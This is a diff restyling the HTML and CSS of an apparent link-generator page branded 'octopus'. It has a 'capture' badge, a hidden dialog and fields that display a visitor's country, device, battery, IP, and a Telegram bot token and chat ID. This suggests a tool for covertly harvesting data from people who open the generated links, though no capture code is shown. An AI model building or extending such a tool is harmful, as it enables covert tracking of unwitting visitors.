@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ================================================================
-           التصميم النهائي — فخم، شيطاني، مع مربع ترحيبي شفاف
+           التصميم النهائي — أحمر دموي غامق + رسالة ترحيبية بسيطة
            ================================================================ */
         * {
             margin: 0;
@@ -19,14 +19,12 @@
         :root {
             --bg-abyss: #030101;
             --bg-panel: rgba(12, 5, 5, 0.92);
-            --blood-fresh: #b80a0a;
-            --blood-dark: #3d0505;
-            --blood-glow: rgba(184, 10, 10, 0.35);
-            --gold-blood: #b8863a;
-            --gold-glow: rgba(184, 134, 58, 0.2);
+            --blood-fresh: #cc0a0a;
+            --blood-dark: #440000;
+            --blood-glow: rgba(204, 10, 10, 0.45);
             --text-hell: #c9b8a8;
             --text-dim: #6a5a4a;
-            --text-blood: #cc3333;
+            --text-blood: #ff2222;
             --font-display: 'Cinzel', 'Georgia', serif;
             --font-mono: 'JetBrains Mono', 'Courier New', monospace;
         }
@@ -49,7 +47,6 @@
             pointer-events: none;
             opacity: 0.85;
         }
-
         .vignette {
             position: fixed;
             inset: 0;
@@ -57,7 +54,6 @@
             pointer-events: none;
             background: radial-gradient(ellipse at center, transparent 30%, rgba(0, 0, 0, 0.85) 100%);
         }
-
         .grain {
             position: fixed;
             inset: 0;
@@ -79,7 +75,7 @@
             position: absolute;
             top: -40px;
             width: 2.5px;
-            background: linear-gradient(180deg, rgba(160, 15, 15, 0.5), transparent);
+            background: linear-gradient(180deg, rgba(200, 20, 20, 0.5), transparent);
             border-radius: 0 0 50% 50%;
             animation: fall-blood linear infinite;
         }
@@ -123,7 +119,7 @@
             }
         }
 
-        /* ===== العيون الشيطانية ===== */
+        /* ===== عيون شيطانية ===== */
         .eye-container {
             position: fixed;
             z-index: 3;
@@ -137,7 +133,7 @@
             height: 100%;
             border-radius: 50%;
             background: radial-gradient(ellipse at center, #150606, #000);
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.9), 0 0 25px rgba(140, 10, 10, 0.12);
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.9), 0 0 25px rgba(200, 20, 20, 0.12);
             position: relative;
             overflow: hidden;
         }
@@ -148,9 +144,9 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: radial-gradient(circle at 35% 35%, #ff4a1a, #6e0d0d 60%, #1a0303);
+            background: radial-gradient(circle at 35% 35%, #ff1a1a, #6e0d0d 60%, #1a0303);
             border-radius: 50%;
-            box-shadow: 0 0 15px rgba(255, 70, 20, 0.3);
+            box-shadow: 0 0 15px rgba(255, 20, 20, 0.3);
             transition: transform 0.06s linear;
         }
         .eye-iris::after {
@@ -236,10 +232,10 @@
         .skull-bg svg {
             width: 100%;
             height: 100%;
-            filter: drop-shadow(0 0 40px rgba(184, 10, 10, 0.05));
+            filter: drop-shadow(0 0 40px rgba(204, 10, 10, 0.05));
         }
 
-        /* ===== الهيكل الأصلي مع التصميم الفخم ===== */
+        /* ===== الهيكل الرئيسي ===== */
         .wrap {
             position: relative;
             z-index: 4;
@@ -251,7 +247,7 @@
             flex-direction: column;
         }
 
-        /* ===== HEADER — class="header" ===== */
+        /* ===== HEADER ===== */
         .header {
             display: flex;
             align-items: center;
@@ -261,11 +257,11 @@
             padding: 16px 28px;
             margin-bottom: 18px;
             background: var(--bg-panel);
-            border: 1px solid rgba(184, 134, 58, 0.08);
+            border: 1px solid rgba(204, 10, 10, 0.15);
             position: relative;
             overflow: hidden;
             clip-path: polygon(0 0, 96% 0, 100% 25%, 100% 100%, 4% 100%, 0 75%);
-            box-shadow: 0 0 60px rgba(0, 0, 0, 0.5), inset 0 0 60px rgba(120, 10, 10, 0.02);
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.5), inset 0 0 60px rgba(204, 10, 10, 0.02);
         }
         .header::after {
             content: '';
@@ -274,7 +270,7 @@
             left: 0;
             width: 100%;
             height: 2px;
-            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--gold-blood), var(--blood-fresh), transparent);
+            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--blood-fresh), transparent);
             background-size: 280% 100%;
             animation: scan-line 5s linear infinite;
         }
@@ -296,13 +292,13 @@
         .brand .sigil {
             width: 42px;
             height: 42px;
-            filter: drop-shadow(0 0 20px rgba(184, 10, 10, 0.25));
+            filter: drop-shadow(0 0 20px rgba(204, 10, 10, 0.25));
         }
         .brand .brand-text .name {
             font-weight: 900;
             font-size: 24px;
             letter-spacing: 4px;
-            background: linear-gradient(120deg, #ff8a4a, #b80a0a, #6a0505, #ff4a1a, #b8863a);
+            background: linear-gradient(120deg, #ff4a4a, #b80a0a, #6a0505, #ff1a1a);
             background-size: 280% 100%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -333,17 +329,17 @@
             font-family: var(--font-display);
             font-size: 11px;
             letter-spacing: 2px;
-            color: var(--gold-blood);
-            border: 1px solid rgba(184, 134, 58, 0.15);
+            color: var(--blood-fresh);
+            border: 1px solid rgba(204, 10, 10, 0.15);
             padding: 6px 18px;
             text-decoration: none;
             text-transform: uppercase;
             clip-path: polygon(0 0, 88% 0, 100% 25%, 100% 100%, 12% 100%, 0 75%);
-            background: rgba(60, 20, 10, 0.05);
+            background: rgba(60, 10, 10, 0.05);
             transition: 0.3s;
         }
         .nav a:hover {
-            background: rgba(184, 10, 10, 0.08);
+            background: rgba(204, 10, 10, 0.1);
             border-color: var(--blood-fresh);
             color: #fff;
         }
@@ -351,51 +347,49 @@
             margin-left: 6px;
         }
 
-        /* ===== النص الترحيبي — شفاف بالكامل ===== */
-        .welcome-text {
-            background: transparent;
-            padding: 10px 14px;
-            margin-bottom: 18px;
+        /* ===== الرسالة الترحيبية البسيطة ===== */
+        .welcome-simple {
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            border: 1px solid rgba(204, 10, 10, 0.08);
+            padding: 14px 20px;
+            margin-bottom: 20px;
             font-family: var(--font-mono);
-            font-size: 13px;
-            line-height: 1.9;
+            font-size: 14px;
+            line-height: 1.8;
             color: var(--text-hell);
-            white-space: pre-wrap;
-            word-break: break-all;
             direction: ltr;
             text-align: left;
             text-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
-            position: relative;
+            border-radius: 4px;
         }
-        .welcome-text .glow {
+        .welcome-simple .glow {
             color: var(--blood-fresh);
             text-shadow: 0 0 25px var(--blood-glow);
         }
-        .welcome-text .gold {
-            color: var(--gold-blood);
-        }
-        .welcome-text .dim {
+        .welcome-simple .dim {
             color: var(--text-dim);
         }
-        .welcome-text .highlight {
-            color: #fff;
-            font-weight: 700;
-        }
-        .welcome-text .link-display {
-            color: #ff8a4a;
+        .welcome-simple .link-display {
+            color: #ff6a6a;
             word-break: break-all;
         }
-        .welcome-text .token-display {
-            color: #ffaa66;
-        }
-        .welcome-text .chat-display {
+        .welcome-simple .chat-display {
             color: #66ccff;
         }
+        .welcome-simple .token-display {
+            color: #ffaa66;
+        }
+        .welcome-simple .icon {
+            color: var(--blood-fresh);
+            margin-left: 6px;
+        }
 
-        /* ===== البطاقة الرئيسية — id="cardArea" ===== */
+        /* ===== البطاقة الرئيسية ===== */
         #cardArea {
             background: var(--bg-panel);
-            border: 1px solid rgba(184, 134, 58, 0.06);
+            border: 1px solid rgba(204, 10, 10, 0.06);
             padding: 28px 28px 32px;
             position: relative;
             overflow: hidden;
@@ -410,7 +404,7 @@
             left: 6%;
             width: 88%;
             height: 2px;
-            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--gold-blood), transparent);
+            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--blood-fresh), transparent);
             background-size: 220% 100%;
             animation: scan-line 4s linear infinite;
         }
@@ -425,11 +419,11 @@
             min-width: 260px;
         }
 
-        /* ===== الفورم — id="formBox" ===== */
+        /* ===== الفورم ===== */
         #formBox {
             background: rgba(0, 0, 0, 0.25);
             padding: 16px 18px 20px;
-            border: 1px solid rgba(184, 134, 58, 0.04);
+            border: 1px solid rgba(204, 10, 10, 0.04);
         }
 
         .field {
@@ -452,7 +446,7 @@
         .field input[type="text"] {
             width: 100%;
             padding: 14px 18px;
-            border: 1px solid rgba(184, 134, 58, 0.08);
+            border: 1px solid rgba(204, 10, 10, 0.08);
             background: rgba(0, 0, 0, 0.45);
             color: var(--text-hell);
             font-family: var(--font-mono);
@@ -462,14 +456,14 @@
         }
         .field input[type="text"]:focus {
             border-color: var(--blood-fresh);
-            box-shadow: 0 0 30px rgba(184, 10, 10, 0.06);
+            box-shadow: 0 0 30px rgba(204, 10, 10, 0.06);
             background: #150808;
         }
         .field input[type="text"]::placeholder {
             color: #4a3a30;
         }
 
-        /* ===== خانات الاختيار — id="featuresGroup" ===== */
+        /* ===== خانات الاختيار ===== */
         .features-label {
             display: flex;
             align-items: center;
@@ -481,7 +475,7 @@
             margin: 6px 0 12px;
         }
         .features-label .glyph {
-            color: var(--gold-blood);
+            color: var(--blood-fresh);
             font-size: 14px;
         }
 
@@ -493,7 +487,7 @@
             overflow-y: auto;
             padding: 4px 2px 4px 0;
             background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(184, 134, 58, 0.04);
+            border: 1px solid rgba(204, 10, 10, 0.04);
         }
         #featuresGroup::-webkit-scrollbar {
             width: 4px;
@@ -518,8 +512,8 @@
             transition: 0.3s;
         }
         .checkbox-item:hover {
-            background: rgba(184, 10, 10, 0.04);
-            border-color: rgba(184, 10, 10, 0.08);
+            background: rgba(204, 10, 10, 0.04);
+            border-color: rgba(204, 10, 10, 0.08);
         }
         .checkbox-item input[type="checkbox"] {
             width: 17px;
@@ -527,7 +521,7 @@
             accent-color: var(--blood-fresh);
             cursor: pointer;
             flex-shrink: 0;
-            filter: drop-shadow(0 0 10px rgba(184, 10, 10, 0.1));
+            filter: drop-shadow(0 0 10px rgba(204, 10, 10, 0.1));
         }
         .checkbox-item label {
             margin: 0;
@@ -553,7 +547,7 @@
             filter: drop-shadow(0 0 20px var(--blood-glow));
         }
 
-        /* ===== الزر — id="generateBtn" ===== */
+        /* ===== الزر ===== */
         .btn {
             width: 100%;
             padding: 18px 22px;
@@ -580,7 +574,7 @@
             left: -100%;
             width: 200%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(230, 150, 80, 0.06), transparent);
+            background: linear-gradient(90deg, transparent, rgba(204, 10, 10, 0.06), transparent);
             animation: sweep-light 2.6s linear infinite;
         }
         @keyframes sweep-light {
@@ -593,23 +587,23 @@
         }
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 0 60px rgba(184, 10, 10, 0.15);
+            box-shadow: 0 0 60px rgba(204, 10, 10, 0.15);
         }
         .btn:active {
             transform: translateY(1px);
         }
         .btn i {
             margin-left: 12px;
-            color: var(--gold-blood);
+            color: var(--blood-fresh);
         }
 
-        /* ===== النتيجة — id="result" ===== */
+        /* ===== النتيجة ===== */
         #result {
             margin-top: 16px;
             padding: 14px 18px;
             background: rgba(0, 0, 0, 0.35);
             backdrop-filter: blur(4px);
-            border: 1px solid rgba(184, 134, 58, 0.06);
+            border: 1px solid rgba(204, 10, 10, 0.06);
             display: flex;
             align-items: center;
             gap: 14px;
@@ -621,12 +615,11 @@
             color: var(--text-hell);
             direction: ltr;
             text-align: left;
-            white-space: pre-wrap;
             word-break: break-all;
         }
         #result #linkText {
             flex: 1;
-            color: #ff8a4a;
+            color: #ff6a6a;
             font-weight: 500;
         }
         #result #linkText i {
@@ -638,8 +631,8 @@
             align-items: center;
             gap: 8px;
             padding: 7px 20px;
-            background: rgba(184, 10, 10, 0.05);
-            border: 1px solid rgba(184, 10, 10, 0.06);
+            background: rgba(204, 10, 10, 0.05);
+            border: 1px solid rgba(204, 10, 10, 0.06);
             color: #d4b0a0;
             font-weight: 600;
             font-size: 12px;
@@ -650,16 +643,16 @@
             clip-path: polygon(0 0, 88% 0, 100% 15%, 100% 100%, 12% 100%, 0 85%);
         }
         .copyBtn:hover {
-            background: rgba(184, 10, 10, 0.1);
+            background: rgba(204, 10, 10, 0.1);
             border-color: var(--blood-fresh);
             color: #fff;
         }
         .copyBtn i {
-            color: var(--gold-blood);
+            color: var(--blood-fresh);
             font-size: 13px;
         }
 
-        /* ===== الفوتر — class="madeby" ===== */
+        /* ===== الفوتر ===== */
         .madeby {
             text-align: center;
             margin-top: 30px;
@@ -673,13 +666,13 @@
             justify-content: center;
             gap: 16px;
             flex-wrap: wrap;
-            border-top: 1px solid rgba(184, 134, 58, 0.04);
+            border-top: 1px solid rgba(204, 10, 10, 0.04);
             padding-top: 22px;
         }
         .madeby .dev {
             font-weight: 800;
             font-size: 15px;
-            background: linear-gradient(120deg, #ff6a2a, var(--gold-blood));
+            background: linear-gradient(120deg, #ff4a4a, var(--blood-fresh));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 4px;
@@ -692,7 +685,7 @@
             margin: 0 6px;
         }
 
-        /* ===== CAPTURE BADGE — id="captureBadge" ===== */
+        /* ===== CAPTURE BADGE ===== */
         #captureBadge {
             position: fixed;
             top: 18px;
@@ -704,7 +697,7 @@
             font-weight: 700;
             font-size: 11px;
             color: var(--blood-fresh);
-            border: 1px solid rgba(184, 10, 10, 0.06);
+            border: 1px solid rgba(204, 10, 10, 0.06);
             display: none;
             align-items: center;
             gap: 12px;
@@ -715,7 +708,7 @@
         }
         #captureBadge i {
             font-size: 14px;
-            color: var(--gold-blood);
+            color: var(--blood-fresh);
         }
         #captureBadge .pulse-ring {
             display: inline-block;
@@ -727,98 +720,9 @@
             box-shadow: 0 0 20px var(--blood-fresh);
         }
 
-        /* ===== الدايلوج — id="mandatoryDialog" (مخفي تماماً) ===== */
+        /* ===== الدايلوج (مخفي) ===== */
         #mandatoryDialog {
             display: none !important;
-        }
-
-        /* ===== صفحة التحميل ===== */
-        .download-page {
-            width: 100%;
-            min-height: 100vh;
-            background: var(--bg-abyss);
-            padding: 30px 20px;
-            font-family: var(--font-mono);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .download-box {
-            max-width: 560px;
-            width: 100%;
-            background: rgba(8, 3, 3, 0.94);
-            backdrop-filter: blur(14px);
-            border: 2px solid rgba(184, 134, 58, 0.04);
-            padding: 34px 30px 38px;
-            box-shadow: 0 0 80px rgba(0, 0, 0, 0.6);
-            text-align: center;
-            clip-path: polygon(0 0, 100% 0, 98% 100%, 2% 100%);
-            position: relative;
-            overflow: hidden;
-        }
-        .download-box::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: repeating-linear-gradient(45deg, transparent, transparent 25px, rgba(184, 10, 10, 0.006) 25px, rgba(184, 10, 10, 0.006) 30px);
-            pointer-events: none;
-        }
-        .download-box h2 {
-            color: #d4b0a0;
-            font-size: 16px;
-            font-weight: 700;
-            line-height: 1.9;
-            margin-bottom: 26px;
-            border-right: 4px solid var(--blood-fresh);
-            padding-right: 18px;
-            text-align: right;
-            font-family: var(--font-display);
-            letter-spacing: 1.5px;
-        }
-        .download-box .ad-box {
-            margin: 18px 0;
-            padding: 14px;
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(184, 134, 58, 0.03);
-            min-height: 80px;
-        }
-        .download-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 16px;
-            background: linear-gradient(135deg, #4a0606, #1a0202);
-            color: #f0d9b8;
-            padding: 20px 52px;
-            font-size: 19px;
-            font-weight: 900;
-            border: none;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 0 50px rgba(125, 13, 13, 0.04);
-            font-family: var(--font-display);
-            margin: 10px 0 4px;
-            clip-path: polygon(0 0, 92% 0, 100% 20%, 100% 100%, 8% 100%, 0 80%);
-            letter-spacing: 4px;
-            text-transform: uppercase;
-        }
-        .download-btn:hover {
-            background: linear-gradient(135deg, #6a0808, #2a0303);
-            transform: scale(1.02);
-            box-shadow: 0 0 80px rgba(184, 10, 10, 0.06);
-        }
-        .download-btn i {
-            font-size: 22px;
-            color: var(--gold-blood);
-        }
-        .download-footer {
-            margin-top: 26px;
-            font-size: 12px;
-            color: #3a2a2a;
-            border-top: 1px solid rgba(184, 134, 58, 0.03);
-            padding-top: 20px;
-            font-family: var(--font-display);
-            letter-spacing: 4px;
-            text-transform: uppercase;
         }
 
         /* ===== SCROLLBAR ===== */
@@ -832,7 +736,7 @@
             background: linear-gradient(180deg, var(--blood-fresh), var(--blood-dark));
         }
         ::-webkit-scrollbar-thumb:hover {
-            background: var(--gold-blood);
+            background: var(--blood-fresh);
         }
 
         /* ===== RESPONSIVE ===== */
@@ -857,9 +761,9 @@
                 font-size: 10px;
                 padding: 4px 14px;
             }
-            .welcome-text {
+            .welcome-simple {
                 font-size: 12px;
-                padding: 10px 12px;
+                padding: 10px 14px;
             }
             #cardArea {
                 padding: 20px 16px 24px;
@@ -867,9 +771,7 @@
             #featuresGroup {
                 grid-template-columns: 1fr;
             }
-            .chains {
-                display: none;
-            }
+            .chains,
             .eye-container {
                 display: none;
             }
@@ -880,27 +782,19 @@
                 font-size: 12px;
             }
         }
-
         @media (max-width: 480px) {
             .brand .brand-text .name {
                 font-size: 16px;
                 letter-spacing: 2px;
             }
-            .welcome-text {
+            .welcome-simple {
                 font-size: 11px;
-                padding: 8px 10px;
+                padding: 8px 12px;
             }
             .btn {
                 font-size: 13px;
                 letter-spacing: 2px;
                 padding: 14px 16px;
-            }
-            .download-box {
-                padding: 22px 16px 26px;
-            }
-            .download-btn {
-                padding: 16px 32px;
-                font-size: 15px;
             }
         }
     </style>
@@ -908,267 +802,136 @@
 <body>
 
     <!-- ============================================================
-    CANVAS — الجحيم الحي
+    الخلفيات والعناصر الزخرفية
     ============================================================ -->
     <canvas id="hellCanvas"></canvas>
     <div class="vignette"></div>
     <div class="grain"></div>
-
-    <!-- ============================================================
-    المطر الدموي
-    ============================================================ -->
     <div class="blood-rain" id="bloodRain"></div>
-
-    <!-- ============================================================
-    قطرات دم من الأعلى
-    ============================================================ -->
     <div id="dripLayer"></div>
 
-    <!-- ============================================================
-    جمجمة خلفية
-    ============================================================ -->
+    <!-- جمجمة -->
     <div class="skull-bg" style="top:12%;left:2%;width:100px;height:130px;opacity:0.05;">
-        <svg viewBox="0 0 100 130">
-            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.15)" stroke="rgba(160,80,50,0.06)" stroke-width="1.5"/>
-            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/>
-            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/>
-            <path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
-            <path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
-            <path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/>
-            <path d="M30,30 L50,20 L70,30" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
-        </svg>
+        <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.15)" stroke="rgba(160,80,50,0.06)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/></svg>
     </div>
     <div class="skull-bg" style="bottom:8%;right:2%;width:120px;height:155px;opacity:0.04;transform:rotate(15deg);">
-        <svg viewBox="0 0 100 130">
-            <path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.12)" stroke="rgba(160,80,50,0.04)" stroke-width="1.5"/>
-            <circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/>
-            <circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/>
-            <path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
-            <path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
-            <path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/>
-        </svg>
+        <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.12)" stroke="rgba(160,80,50,0.04)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/></svg>
     </div>
 
-    <!-- ============================================================
-    العيون الشيطانية
-    ============================================================ -->
-    <div class="eye-container" data-eye style="top:5%;left:2%;--s:36px;">
-        <div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div>
-    </div>
-    <div class="eye-container" data-eye style="top:5%;right:2%;--s:36px;">
-        <div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div>
-    </div>
-    <div class="eye-container" data-eye style="bottom:8%;left:3.5%;--s:28px;">
-        <div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div>
-    </div>
-    <div class="eye-container" data-eye style="bottom:8%;right:3.5%;--s:28px;">
-        <div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div>
-    </div>
+    <!-- عيون شيطانية -->
+    <div class="eye-container" data-eye style="top:5%;left:2%;--s:36px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
+    <div class="eye-container" data-eye style="top:5%;right:2%;--s:36px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
+    <div class="eye-container" data-eye style="bottom:8%;left:3.5%;--s:28px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
+    <div class="eye-container" data-eye style="bottom:8%;right:3.5%;--s:28px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
 
-    <!-- ============================================================
-    السلاسل
-    ============================================================ -->
-    <div class="chains l">
-        <div class="chain-link" style="--a:-11deg;--b:11deg;--dur:5.4s;"></div>
-        <div class="chain-link" style="--a:9deg;--b:-9deg;--dur:5.9s;"></div>
-        <div class="chain-link" style="--a:-13deg;--b:13deg;--dur:4.8s;"></div>
-    </div>
-    <div class="chains r">
-        <div class="chain-link" style="--a:12deg;--b:-12deg;--dur:5.1s;"></div>
-        <div class="chain-link" style="--a:-10deg;--b:10deg;--dur:5.7s;"></div>
-        <div class="chain-link" style="--a:14deg;--b:-14deg;--dur:4.5s;"></div>
-    </div>
+    <!-- سلاسل -->
+    <div class="chains l"><div class="chain-link" style="--a:-11deg;--b:11deg;--dur:5.4s;"></div><div class="chain-link" style="--a:9deg;--b:-9deg;--dur:5.9s;"></div><div class="chain-link" style="--a:-13deg;--b:13deg;--dur:4.8s;"></div></div>
+    <div class="chains r"><div class="chain-link" style="--a:12deg;--b:-12deg;--dur:5.1s;"></div><div class="chain-link" style="--a:-10deg;--b:10deg;--dur:5.7s;"></div><div class="chain-link" style="--a:14deg;--b:-14deg;--dur:4.5s;"></div></div>
 
-    <!-- ============================================================
-    CAPTURE BADGE — id="captureBadge"
-    ============================================================ -->
-    <div id="captureBadge">
-        <i class="fas fa-skull"></i>
-        <span class="pulse-ring"></span>
-        <span>جلسة نشطة</span>
-    </div>
+    <!-- ===== CAPTURE BADGE ===== -->
+    <div id="captureBadge"><i class="fas fa-skull"></i><span class="pulse-ring"></span><span>Active Session</span></div>
 
     <!-- ============================================================
     MAIN WRAP
     ============================================================ -->
     <div class="wrap">
 
-        <!-- ===== HEADER — class="header" ===== -->
+        <!-- ===== HEADER ===== -->
         <header class="header">
             <div class="brand">
-                <svg class="sigil" viewBox="0 0 100 100">
-                    <circle cx="50" cy="50" r="42" fill="none" stroke="#b8863a" stroke-width="1.4" opacity="0.5"/>
-                    <circle cx="50" cy="50" r="30" fill="none" stroke="#b80a0a" stroke-width="1.2" opacity="0.4"/>
-                    <path d="M50 10 L61 40 L92 40 L67 58 L77 88 L50 70 L23 88 L33 58 L8 40 L39 40 Z" fill="none" stroke="#b80a0a" stroke-width="1.3" opacity="0.6"/>
-                    <circle cx="50" cy="50" r="3.5" fill="#b8863a"/>
-                </svg>
-                <div class="brand-text">
-                    <div class="name">𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆</div>
-                    <div class="sub">الريد روم · الدائرة الداخلية</div>
-                </div>
+                <svg class="sigil" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="#cc0a0a" stroke-width="1.4" opacity="0.5"/><circle cx="50" cy="50" r="30" fill="none" stroke="#cc0a0a" stroke-width="1.2" opacity="0.4"/><path d="M50 10 L61 40 L92 40 L67 58 L77 88 L50 70 L23 88 L33 58 L8 40 L39 40 Z" fill="none" stroke="#cc0a0a" stroke-width="1.3" opacity="0.6"/><circle cx="50" cy="50" r="3.5" fill="#ff1a1a"/></svg>
+                <div class="brand-text"><div class="name">𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆</div><div class="sub">The Red Room · Inner Circle</div></div>
             </div>
-            <div class="nav">
-                <a href="#"><i class="fas fa-terminal"></i> كونسول</a>
-                <a href="#"><i class="fas fa-shield-alt"></i> حماية</a>
-            </div>
+            <div class="nav"><a href="#"><i class="fas fa-terminal"></i> Console</a><a href="#"><i class="fas fa-shield-alt"></i> Shield</a></div>
         </header>
 
-        <!-- ===== النص الترحيبي — شفاف بالكامل ===== -->
-        <div class="welcome-text" id="welcomeText">
-            <span class="gold">⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒</span>
-            ╭⊚─〔 ʟɪɴᴋ 〕───────
-            ┃˹🔗˼ <span class="glow">⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧</span> ⭒
-            ┃⍟ <span class="link-display" id="personalLink">جارٍ التحميل...</span>
-            ┃˹🔥˼ <span class="gold">ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ</span> ⭒
-            ╰───────────────
-
-            <span class="gold">⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒</span>
-            ╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────
-            ┃˹👨‍💻˼ <span class="highlight">@xx_8k</span> ⭒
-            ╰───────────────
-
-            <span class="gold">⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒</span>
-            ╭⊚─〔 ᴅᴀᴛᴀ 〕───────
-            ┃ <span class="dim">📍 الدولة</span>     › <span id="visitorCountry">غير معروف</span>
-            ┃ <span class="dim">📱 الجهاز</span>     › <span id="visitorDevice">Unknown</span>
-            ┃ <span class="dim">🔋 البطارية</span>   › <span id="visitorBattery">غير متاح</span>
-            ┃ <span class="dim">🌐 الـ IP</span>      › <span id="visitorIP">غير معروف</span>
-            ┃ <span class="dim">🕒 الوقت</span>      › <span id="visitorTime">--</span>
-            ┃ <span class="dim">🆔 Chat ID</span>    › <span class="chat-display" id="displayChatId">Unknown</span>
-            ┃ <span class="dim">🤖 Bot Token</span>  › <span class="token-display" id="displayBotToken">Unknown...</span>
-            ┃ <span class="dim">🏷️ Bot User</span>  › <span class="highlight">@V_V_9BOT</span>
-            ╰━━━━━━━━━━━━━━━━━━━━━━━╯
-            <span style="display:block;text-align:center;margin-top:6px;color:var(--gold-blood);font-size:14px;letter-spacing:3px;">
-                𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐
-            </span>
+        <!-- ===== الرسالة الترحيبية البسيطة (بدون إطارات) ===== -->
+        <div class="welcome-simple" id="welcomeText">
+            <span class="icon">☠</span> <span class="glow">⛧ Welcome to 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ Bot ⛧</span> <span class="icon">𖤐</span><br>
+            <span class="dim">⭑ Personal Link ⭒</span><br>
+            <span class="link-display" id="personalLink">Loading...</span><br>
+            <span class="dim">⭑ Visitor Data ⭒</span><br>
+            <span class="dim">📍 Country</span> › <span id="visitorCountry">Unknown</span><br>
+            <span class="dim">📱 Device</span> › <span id="visitorDevice">Unknown</span><br>
